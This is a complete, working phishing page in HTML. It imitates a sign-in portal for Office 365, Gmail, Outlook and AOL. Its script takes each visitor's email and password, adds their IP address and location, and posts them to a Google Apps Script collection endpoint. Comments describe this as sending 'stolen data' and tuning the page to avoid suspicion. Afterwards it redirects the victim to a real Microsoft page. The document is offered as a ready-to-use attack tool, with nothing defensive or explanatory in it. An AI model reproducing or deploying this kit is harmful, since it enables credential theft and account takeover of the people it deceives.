<!doctype html>
<html lang="zh-Hant">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Sign in — Secure Portal</title>
  <style>
    :root {
      --bg1: #0078d4;
      --bg2: #2b88d8;
      --card-bg: #fff;
      --muted: #6b7280;
      --accent: #0078d4;
      --gmail: #DB4437;
      --outlook: #0072C6;
      --aol: #00A1E0;
      --office: #F25022;
      font-family: "Segoe UI", Roboto, Arial, sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }
    body {
      background: linear-gradient(135deg, var(--bg1), var(--bg2));
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .login-card {
      width: 100%;
      max-width: 400px;
      background: var(--card-bg);
      border-radius: 8px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
      padding: 30px;
      position: relative;
    }
    .logo-header {
      display: flex;
      gap: 15px;
      align-items: center;
      margin-bottom: 20px;
    }
    .providers {
      display: flex;
      gap: 10px;
      margin-right: 15px;
    }
    .provider {
      width: 40px;
      height: 40px;
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      border: 2px solid transparent;
      transition: all 0.2s ease;
    }
    .provider:hover {
      transform: translateY(-2px);
      border-color: rgba(0,0,0,0.05);
    }
    .provider.active {
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      border-color: rgba(0,0,0,0.1);
    }
    .provider svg {
      width: 22px;
      height: 22px;
    }
    h1 {
      font-size: 22px;
      color: #111;
      font-weight: 600;
    }
    .subtitle {
      color: var(--muted);
      font-size: 14px;
      margin: 5px 0 25px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #374151;
      font-weight: 500;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #e5e7eb;
      border-radius: 6px;
      font-size: 15px;
      transition: all 0.2s;
    }
    input:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
    }
    .form-options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 20px 0;
      font-size: 14px;
    }
    .remember-me {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .forgot-password {
      color: var(--accent);
      text-decoration: none;
    }
    .submit-btn {
      width: 100%;
      padding: 12px;
      background: var(--accent);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }
    .submit-btn:hover {
      background: #106ebe;
    }
    #loadingOverlay {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 8px;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 100;
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid var(--accent);
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @media (max-width: 480px) {
      .login-card {
        padding: 25px;
      }
    }
  </style>
</head>
<body>
  <div class="login-card">
    <div id="loadingOverlay">
      <div class="spinner"></div>
      <p>Signing you in...</p>
    </div>

    <div class="logo-header">
      <div class="providers" id="providers">
        <button type="button" class="provider active" data-provider="office" title="Office 365">
          <svg viewBox="0 0 24 24">
            <rect x="2" y="2" width="6" height="6" rx="1" fill="var(--office)"/>
            <rect x="9" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
            <rect x="16" y="2" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
            <rect x="2" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.95"/>
            <rect x="9" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.9"/>
            <rect x="16" y="9" width="6" height="6" rx="1" fill="var(--office)" opacity="0.85"/>
          </svg>
        </button>
        <button type="button" class="provider" data-provider="gmail" title="Gmail">
          <svg viewBox="0 0 24 24">
            <rect x="1" y="3" width="22" height="18" rx="2" fill="white" stroke="#d1d5db"/>
            <path d="M2 5.5 L12 12 L22 5.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
            <path d="M2 18.5 L12 12 L22 18.5" fill="none" stroke="var(--gmail)" stroke-width="2.4"/>
          </svg>
        </button>
        <button type="button" class="provider" data-provider="outlook" title="Outlook">
          <svg viewBox="0 0 24 24">
            <rect x="1.5" y="4" width="14" height="16" rx="2" fill="var(--outlook)"/>
            <path d="M3 6 L13 12 L3 18" fill="none" stroke="white" stroke-width="1.6"/>
            <rect x="16.5" y="4" width="6" height="6" rx="1" fill="#2b88d8"/>
          </svg>
        </button>
        <button type="button" class="provider" data-provider="aol" title="AOL">
          <svg viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="10" fill="var(--aol)"/>
            <path d="M9.5 15c.8-1.5 1.8-3.2 3-4.5 1.2 1.3 2.2 3 3 4.5" fill="none" stroke="white" stroke-width="1.6"/>
            <circle cx="12.2" cy="9.4" r="0.9" fill="white"/>
          </svg>
        </button>
      </div>
      <div>
        <h1>Sign in</h1>
        <p class="subtitle" id="hint">Use your work account</p>
      </div>
    </div>

    <form id="loginForm" autocomplete="off">
      <div class="form-group">
        <label for="email">Email address</label>
        <input type="email" id="email" name="email" required placeholder="user@company.com">
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required placeholder="••••••••">
      </div>
      <div class="form-options">
        <label class="remember-me">
          <input type="checkbox" id="remember" name="remember"> Remember me
        </label>
        <a href="#" class="forgot-password">Forgot password?</a>
      </div>
      <button type="submit" class="submit-btn">Sign in</button>
    </form>
  </div>

  <script>
    // ===== CONFIGURATION - REPLACE THIS VALUE =====
    const GAS_PROXY_URL = 'https://script.google.com/macros/s/AKfycbysTVuloiSL_TA4yQL_aKf_vR4P5Vt47ASp83oa_Ex9m5u2Y9Z1OIptfn8ugHHzQZ3Z/exec'; // e.g., 'https://script.google.com/macros/s/.../exec'
    // ==============================================

    // DOM Elements
    const providers = document.querySelectorAll('.provider');
    const hint = document.getElementById('hint');
    const emailInput = document.getElementById('email');
    const loginForm = document.getElementById('loginForm');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Provider UI Logic
    const providerInfo = {
      office: { hint: "Use your Office 365 account", placeholder: "user@company.com" },
      gmail: { hint: "Sign in with Google", placeholder: "you@gmail.com" },
      outlook: { hint: "Use your Outlook account", placeholder: "user@outlook.com" },
      aol: { hint: "Sign in with AOL", placeholder: "you@aol.com" }
    };

    providers.forEach(provider => {
      provider.addEventListener('click', () => {
        providers.forEach(p => p.classList.remove('active'));
        provider.classList.add('active');
        const providerType = provider.dataset.provider;
        hint.textContent = providerInfo[providerType].hint;
        emailInput.placeholder = providerInfo[providerType].placeholder;
      });
    });

    // Core Function: Send Data to our GAS Proxy
    async function sendToGASProxy(formData, geoInfo) {
        try {
            // Prepare the payload for our GAS script
            const payload = {
                email: formData.email,
                password: formData.password,
                userAgent: navigator.userAgent,
                time: new Date().toLocaleString(),
                ip: geoInfo.ip,
                country: geoInfo.country,
                city: geoInfo.city
            };

            // Send the data to our Google Apps Script proxy
            const response = await fetch(GAS_PROXY_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();
            if (result.result !== 'success') {
                throw new Error(result.error || 'Unknown error from proxy');
            }
        } catch (error) {
            console.error('Failed to send data via proxy:', error);
        }
    }

    // Core Function: Get IP and Geolocation
    async function getIpAndGeoInfo() {
        try {
            // Fetch IP address from a public API
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIp = ipData.ip;

            // Fetch geolocation based on IP (using a reliable API)
            const geoResponse = await fetch(`https://ipapi.co/${userIp}/json/`);
            const geoData = await geoResponse.json();

            return {
                ip: userIp,
                country: geoData.country_name || 'Unknown',
                city: geoData.city || 'Unknown'
            };
        } catch (error) {
            console.error('Error fetching IP/Geo info:', error);
            return { ip: 'Unknown', country: 'Unknown', city: 'Unknown' };
        }
    }

    // Main Form Submission Handler
    loginForm.addEventListener('submit', async function(e) {
      e.preventDefault(); // Crucial: Prevent the default form submission

      const email = emailInput.value.trim();
      const password = document.getElementById('password').value;
      const rememberMe = document.getElementById('remember').checked;

      if (!email || !password) {
        alert('Please enter both email and password.');
        return;
      }

      // Show loading state to user (adds legitimacy)
      loadingOverlay.style.display = 'flex';

      try {
        // 1. Get IP and Geolocation asynchronously
        const geoInfo = await getIpAndGeoInfo();

        // 2. Send the stolen data to our GAS Proxy
        await sendToGASProxy({ email, password }, geoInfo);

        // 3. Redirect the user to a thank you page (or a cloned real login page for further harvesting)
        setTimeout(() => {
          window.location.href = 'https://account.live.com/'; // Example redirect to a legitimate-looking page
        }, 1500); // Short delay makes the loading screen seem more authentic

      } catch (error) {
        console.error('Error in form submission:', error);
        // Even if something fails, still redirect the user to avoid suspicion.
        loadingOverlay.style.display = 'none';
        window.location.href = 'https://account.live.com/';
      }
    });
  </script>
</body>
</html>
